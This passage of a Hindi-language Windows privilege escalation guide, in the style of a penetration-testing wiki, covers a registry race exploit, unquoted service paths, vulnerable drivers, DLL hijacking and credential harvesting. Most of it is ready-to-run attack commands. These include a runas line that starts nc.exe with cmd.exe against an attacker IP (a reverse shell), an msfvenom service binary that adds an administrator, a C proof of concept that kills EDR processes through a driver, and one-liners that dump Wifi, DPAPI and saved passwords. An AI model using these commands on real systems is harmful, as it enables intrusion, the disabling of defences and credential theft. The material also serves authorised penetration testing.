Abuse flow (CVE-2026-24291 / ATConfig):

1. उस **HKCU ATConfig** वैल्यू को भरें जिसे आप चाहते हैं कि SYSTEM लिखे।
2. secure-desktop copy को ट्रिगर करें (जैसे, **LockWorkstation**), जो AT broker flow शुरू करता है।
3. **Win the race** इस तरह कि `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml` पर एक **oplock** रखें; जब oplock फायर हो, तो **HKLM Session ATConfig** key को एक सुरक्षित HKLM target की ओर **registry link** से बदल दें।
4. SYSTEM attacker-चयनित वैल्यू को redirected HKLM path पर लिखता है।

एक बार जब आपके पास arbitrary HKLM value write हो, तो service configuration वैल्यूज़ को overwrite करके LPE की ओर pivot करें:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

ऐसा सर्विस चुनें जिसे सामान्य उपयोगकर्ता शुरू कर सके (जैसे, **`msiserver`**) और write के बाद उसे trigger करें। **Note:** public exploit implementation race के हिस्से के रूप में **workstation को लॉक** करता है।

Example tooling (RegPwn BOF / standalone):
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### Services registry AppendData/AddSubdirectory permissions

यदि आपके पास किसी registry पर यह permission है, तो इसका मतलब है कि **आप इस registry से सब-registries बना सकते हैं**। Windows services के मामले में यह **arbitrary code execute करने के लिए पर्याप्त है:**

{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

यदि executable के path को quotes में नहीं रखा गया है, तो Windows स्पेस से पहले के हर भाग को execute करने की कोशिश करेगा।

उदाहरण के लिए, path _C:\Program Files\Some Folder\Service.exe_ के लिए Windows निम्नलिखित execute करने की कोशिश करेगा:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
built-in Windows services से संबंधित न होने वाले सभी unquoted service paths सूचीबद्ध करें:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**आप इस कमजोरी का पता लगा सकते हैं और exploit कर सकते हैं** इसको metasploit के साथ: `exploit/windows/local/trusted\_service\_path` आप metasploit का उपयोग करके मैन्युअली एक service binary बना सकते हैं:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### रिकवरी क्रियाएँ

Windows उपयोगकर्ताओं को निर्दिष्ट करने की अनुमति देता है कि यदि कोई सेवा विफल हो तो कौन-सी क्रियाएँ की जानी चाहिए। इस फीचर को किसी binary की ओर इशारा करने के लिए कॉन्फ़िगर किया जा सकता है। यदि यह binary replaceable है, तो privilege escalation संभव हो सकता है। अधिक जानकारी [official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>) में मिल सकती है।

## एप्लिकेशन

### स्थापित एप्लिकेशन

जांचें **binaries की permissions** (शायद आप किसी को overwrite करके privileges escalate कर सकें) और **फ़ोल्डरों** की भी ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### लिखने की अनुमतियाँ

जाँच करें कि क्या आप किसी config file को संशोधित करके कोई विशेष फ़ाइल पढ़ सकते हैं, या क्या आप किसी binary को संशोधित कर सकते हैं जिसे Administrator खाते द्वारा निष्पादित किया जाएगा (schedtasks)।

सिस्टम में कमजोर फ़ोल्डर/फ़ाइल अनुमतियाँ खोजने का एक तरीका है:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Notepad++ plugin autoload persistence/execution

Notepad++ अपने `plugins` सबफ़ोल्डर्स के तहत किसी भी plugin DLL को autoloads करता है। अगर एक writable portable/copy install मौजूद है, तो एक malicious plugin डालने से हर लॉन्च पर `notepad++.exe` के अंदर automatic code execution मिलती है (शामिल है `DllMain` और plugin callbacks)।

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Run at startup

**जाँचें कि क्या आप किसी ऐसी registry या binary को overwrite कर सकते हैं जो किसी दूसरे user द्वारा execute की जाएगी।**\
**पढ़ें** निम्नलिखित पृष्ठ ताकि आप दिलचस्प **autoruns locations to escalate privileges** के बारे में और जान सकें:

{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

संभावित **third party weird/vulnerable** drivers खोजें
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
यदि कोई ड्राइवर arbitrary kernel read/write primitive (अक्सर poorly designed IOCTL handlers में) उजागर करता है, तो आप kernel memory से सीधे SYSTEM token चुरा कर privilege escalation कर सकते हैं। चरण-दर-चरण तकनीक यहाँ देखें:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

उन race-condition बग्स के लिए जहाँ vulnerable कॉल attacker-controlled Object Manager path खोलता है, lookup को जानबूझ कर धीमा करना (using max-length components या deep directory chains) विंडो को माइक्रोसेकंड से दसों माइक्रोसेकंड तक बढ़ा सकता है:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Registry hive memory corruption primitives

आधुनिक hive कमज़ोरी आपको deterministic layouts groom करने, writable HKLM/HKU descendants का दुरुपयोग करने, और metadata corruption को बिना custom driver के kernel paged-pool overflows में बदलने देती हैं। पूरी chain यहाँ पढ़ें:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Device objects पर FILE_DEVICE_SECURE_OPEN की अनुपस्थिति का दुरुपयोग (LPE + EDR kill)

कुछ signed third‑party drivers अपना device object strong SDDL के साथ IoCreateDeviceSecure के माध्यम से बनाते हैं पर DeviceCharacteristics में FILE_DEVICE_SECURE_OPEN सेट करना भूल जाते हैं। इस flag के बिना, secure DACL उस समय लागू नहीं होती जब device को ऐसे path से खोला जाता है जिसमें एक extra component हो, जिससे कोई भी unprivileged user निम्न namespace path का उपयोग करके handle प्राप्त कर सकता है:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (from a real-world case)

एक बार user device खोल सके, driver द्वारा expose किए गए privileged IOCTLs का दुरुपयोग LPE और tampering के लिए किया जा सकता है। वास्तविक दुनिया में देखी गई उदाहरण क्षमताएँ:
- किसी भी arbitrary process को full-access handles लौटाना (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
- Unrestricted raw disk read/write (offline tampering, boot-time persistence tricks).
- किसी भी arbitrary process को terminate करना, Protected Process/Light (PP/PPL) सहित, जिससे user land से kernel के माध्यम से AV/EDR को kill किया जा सके।

न्यूनतम PoC पैटर्न (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Mitigations for developers
- जब आप ऐसे device objects बना रहे हों जिन्हें किसी DACL द्वारा restricted किया जाना है, तो हमेशा FILE_DEVICE_SECURE_OPEN सेट करें।
- privileged operations के लिए caller context को validate करें। process termination या handle returns की अनुमति देने से पहले PP/PPL checks जोड़ें।
- IOCTLs को सीमित रखें (access masks, METHOD_*, input validation) और direct kernel privileges के बजाय brokered models पर विचार करें।

Detection ideas for defenders
- संदिग्ध device नामों के user-mode opens (e.g., \\ .\\amsdk*) और दुरुपयोग सूचक विशिष्ट IOCTL अनुक्रमों की निगरानी करें।
- Microsoft’s vulnerable driver blocklist (HVCI/WDAC/Smart App Control) लागू करें और अपनी allow/deny सूचियाँ बनाए रखें।


## PATH DLL Hijacking

यदि आपके पास PATH पर मौजूद किसी फ़ोल्डर के अंदर **write permissions** हैं तो आप किसी प्रोसेस द्वारा लोड की गई DLL को **hijack** करके **escalate privileges** कर सकते हैं।

Check permissions of all folders inside PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
इस चेक का दुरुपयोग कैसे किया जाए, इसके बारे में अधिक जानकारी के लिए:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## नेटवर्क

### शेयर
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

hosts file में hardcoded अन्य ज्ञात कंप्यूटरों की जाँच करें
```
type C:\Windows\System32\drivers\etc\hosts
```
### नेटवर्क इंटरफेस & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Open Ports

बाहरी से **restricted services** के लिए जाँच करें
```bash
netstat -ano #Opened ports?
```
### रूटिंग तालिका
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP तालिका
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### फ़ायरवॉल नियम

[**फ़ायरवॉल से संबंधित कमांड्स के लिए इस पेज को देखें**](../basic-cmd-for-pentesters.md#firewall) **(नियम दिखाएँ, नियम बनाएं, बंद करें...)**

अधिक[ नेटवर्क enumeration के लिए कमांड्स यहाँ](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
बाइनरी `bash.exe` भी `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` में मिल सकती है

यदि आप root user प्राप्त कर लेते हैं तो आप किसी भी पोर्ट पर listen कर सकते हैं (पहली बार जब आप किसी पोर्ट पर listen करने के लिए `nc.exe` का उपयोग करेंगे तो GUI के माध्यम से पूछा जाएगा कि क्या फ़ायरवॉल द्वारा `nc` को अनुमति दी जानी चाहिए)।
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
bash को root के रूप में आसानी से शुरू करने के लिए, आप `--default-user root` आजमा सकते हैं

आप `WSL` फ़ाइलसिस्टम को फ़ोल्डर `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` में एक्सप्लोर कर सकते हैं

## Windows क्रेडेंशियल्स

### Winlogon क्रेडेंशियल्स
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### क्रेडेंशियल मैनेजर / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\  
The Windows Vault सर्वरों, वेबसाइटों और अन्य प्रोग्राम्स के लिए उपयोगकर्ता क्रेडेंशियल्स संग्रहीत करता है जिन्हें **Windows** कर सकता है **उपयोगकर्ताओं को स्वचालित रूप से लॉग इन कर**y. पहली नजर में ऐसा लग सकता है कि उपयोगकर्ता अपने Facebook credentials, Twitter credentials, Gmail credentials आदि संग्रहीत कर सकते हैं, ताकि वे ब्राउज़रों के जरिए स्वतः लॉग इन हो सकें। पर ऐसा नहीं है।

Windows Vault उन क्रेडेंशियल्स को संग्रहीत करता है जिन्हें Windows स्वचालित रूप से उपयोगकर्ता लॉग इन करने के लिए उपयोग कर सकता है, जिसका अर्थ है कि कोई भी **Windows application that needs credentials to access a resource** (server or a website) **can make use of this Credential Manager** & Windows Vault का उपयोग कर सकता है और दिए गए क्रेडेंशियल्स का उपयोग कर सकता है, बजाय इसके कि उपयोगकर्ता बार-बार username और password दर्ज करें।

जब तक applications Credential Manager के साथ interact नहीं करतीं, मेरा नहीं लगता कि वे किसी दिए गए resource के लिए credentials का उपयोग कर सकेंगी। इसलिए, यदि आपका application vault का उपयोग करना चाहता है, तो उसे किसी न किसी तरह **credential manager से संवाद कर के और उस resource के लिए credentials का अनुरोध** default storage vault से करना चाहिए।

Use the `cmdkey` to list the stored credentials on the machine.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
फिर आप सेव किए गए क्रेडेंशियल्स का उपयोग करने के लिए `/savecred` विकल्पों के साथ `runas` का उपयोग कर सकते हैं। निम्नलिखित उदाहरण एक SMB शेयर के माध्यम से एक रिमोट बाइनरी को कॉल कर रहा है।
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
प्रदत्त credential सेट के साथ `runas` का उपयोग करना।
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
ध्यान दें कि mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), या [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1) से।

### DPAPI

The **Data Protection API (DPAPI)** डेटा के symmetric एन्क्रिप्शन का एक तरीका प्रदान करता है, जो मुख्यतः Windows operating system में asymmetric private keys के symmetric एन्क्रिप्शन के लिए उपयोग किया जाता है। यह एन्क्रिप्शन entropy में महत्वपूर्ण योगदान देने के लिए user या system secret का उपयोग करता है।

**DPAPI उपयोगकर्ता के लॉगिन सीक्रेट्स से व्युत्पन्न एक symmetric key के माध्यम से keys का एन्क्रिप्शन सक्षम करता है**। सिस्टम-एन्क्रिप्शन के परिदृश्यों में, यह सिस्टम के डोमेन प्रमाणीकरण रहस्यों का उपयोग करता है।

DPAPI का उपयोग करके एन्क्रिप्ट किए गए user RSA keys %APPDATA%\Microsoft\Protect\{SID} डायरेक्टरी में संग्रहीत होते हैं, जहां {SID} उपयोगकर्ता के [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) का प्रतिनिधित्व करता है। **The DPAPI key, co-located with the master key that safeguards the user's private keys in the same file**, आमतौर पर 64 बाइट्स का random डेटा होता है। (यह महत्वपूर्ण है कि इस डायरेक्टरी तक पहुँच प्रतिबंधित है, जो CMD में `dir` कमांड के माध्यम से इसकी सामग्री को सूचीबद्ध करने से रोकती है, हालांकि इसे PowerShell के माध्यम से सूचीबद्ध किया जा सकता है)।
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
आप इसे डिक्रिप्ट करने के लिए उपयुक्त आर्गुमेंट्स (`/pvk` या `/rpc`) के साथ **mimikatz module** `dpapi::masterkey` का उपयोग कर सकते हैं।

**credentials files protected by the master password** आमतौर पर निम्न स्थानों पर पाए जाते हैं:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
आप उपयुक्त `/masterkey` के साथ **mimikatz module** `dpapi::cred` का उपयोग करके डिक्रिप्ट कर सकते हैं.\
आप `sekurlsa::dpapi` module का उपयोग करके **memory** से कई **DPAPI** **masterkeys** निकाल सकते हैं (यदि आप root हैं)।

{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell क्रेडेंशियल्स

**PowerShell credentials** का उपयोग अक्सर scripting और automation कार्यों में सुविधाजनक तरीके से encrypted credentials स्टोर करने के लिए किया जाता है। ये credentials **DPAPI** द्वारा सुरक्षित होते हैं, जिसका सामान्यतः अर्थ यह है कि इन्हें केवल उसी उपयोगकर्ता द्वारा उसी कंप्यूटर पर डिक्रिप्ट किया जा सकता है जहाँ इन्हें बनाया गया था।

To **decrypt** a PS credentials from the file containing it you can do:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### सहेजे गए RDP कनेक्शन

आप इन्हें `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\ और `HKCU\Software\Microsoft\Terminal Server Client\Servers\` में पा सकते हैं।

### हाल ही में चलाए गए कमांड
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **रिमोट डेस्कटॉप क्रेडेंशियल मैनेजर**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Use the **Mimikatz** `dpapi::rdg` module with appropriate `/masterkey` to **decrypt any .rdg files**\
You can **extract many DPAPI masterkeys** from memory with the Mimikatz `sekurlsa::dpapi` module

### Sticky Notes

लोग अक्सर Windows वर्कस्टेशनों पर StickyNotes app का उपयोग पासवर्ड और अन्य जानकारी **save** करने के लिए करते हैं, यह नहीं जानते कि यह एक database फ़ाइल है। यह फ़ाइल इस पथ पर स्थित है `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` और इसे हमेशा खोजने और जांचने के लायक माना जाता है।

### AppCmd.exe

**Note that to recover passwords from AppCmd.exe you need to be Administrator and run under a High Integrity level.**\
**AppCmd.exe** is located in the `%systemroot%\system32\inetsrv\` directory.\
यदि यह फ़ाइल मौजूद है तो संभव है कि कुछ **credentials** configure किए गए हों और उन्हें **recovered** किया जा सके।

This code was extracted from [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

जाँचें कि `C:\Windows\CCM\SCClient.exe` मौजूद है .\
इंस्टॉलर्स **run with SYSTEM privileges**, कई **DLL Sideloading (Info from** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).** के लिए vulnerable हैं।
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## फ़ाइलें और Registry (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH होस्ट कुंजियाँ
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH keys in registry

SSH private keys को registry key `HKCU\Software\OpenSSH\Agent\Keys` के अंदर संग्रहीत किया जा सकता है, इसलिए आपको यह जांचना चाहिए कि वहाँ कुछ रोचक है या नहीं:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
यदि आपको उस पथ के अंदर कोई एंट्री मिलती है, तो यह संभवतः एक सहेजी हुई SSH key होगी। यह एन्क्रिप्टेड रूप में संग्रहीत होती है लेकिन इसे आसानी से [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) का उपयोग करके डिक्रिप्ट किया जा सकता है।\
More information about this technique here: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

यदि `ssh-agent` service चल नहीं रही है और आप चाहते हैं कि यह बूट पर स्वतः शुरू हो, तो चलाएँ:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> ऐसा लगता है कि यह तकनीक अब मान्य नहीं है। मैंने कुछ ssh keys बनाए, उन्हें `ssh-add` से जोड़ा और ssh के माध्यम से मशीन में login किया। रजिस्ट्री HKCU\Software\OpenSSH\Agent\Keys मौजूद नहीं है और procmon ने asymmetric key authentication के दौरान `dpapi.dll` के उपयोग की पहचान नहीं की।

### अनदेखी फ़ाइलें
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
आप इन फ़ाइलों को **metasploit** का उपयोग करके भी खोज सकते हैं: _post/windows/gather/enum_unattend_

उदाहरण सामग्री:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM बैकअप्स
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Cloud Credentials
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

एक फ़ाइल खोजें जिसका नाम **SiteList.xml** हो

### Cached GPP Pasword

एक ऐसी सुविधा पहले उपलब्ध थी जो Group Policy Preferences (GPP) के माध्यम से मशीनों के समूह पर कस्टम लोकल administrator अकाउंट्स deploy करने की अनुमति देती थी। हालांकि, इस तरीके में गंभीर सुरक्षा दोष थे। सबसे पहले, Group Policy Objects (GPOs), जो SYSVOL में XML फ़ाइलों के रूप में संग्रहीत होते हैं, किसी भी डोमेन उपयोगकर्ता द्वारा एक्सेस किए जा सकते थे। दूसरे, इन GPPs के भीतर के पासवर्ड, जो AES256 के साथ सार्वजनिक रूप से डॉक्यूमेंटेड default key का उपयोग करके encrypt किए गए थे, किसी भी प्रमाणीकृत उपयोगकर्ता द्वारा decrypt किए जा सकते थे। इससे गंभीर जोखिम उत्पन्न होता था, क्योंकि इससे उपयोगकर्ताओं को उच्चाधिकार प्राप्त करने का मौका मिल सकता था।

इस जोखिम को कम करने के लिए, एक फ़ंक्शन विकसित किया गया जो लोकली cached GPP फ़ाइलों के लिए scan करता है जिनमें "cpassword" फ़ील्ड खाली नहीं है। ऐसी फ़ाइल मिलने पर, फ़ंक्शन पासवर्ड को डिक्रिप्ट करता है और एक custom PowerShell object लौटाता है। यह ऑब्जेक्ट GPP और फ़ाइल के स्थान के बारे में विवरण शामिल करता है, जो इस सुरक्षा समस्या की पहचान और समाधान में मदद करता है।

Search in `C:\ProgramData\Microsoft\Group Policy\history` or in _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (previous to W Vista)_ for these files:

- Groups.xml
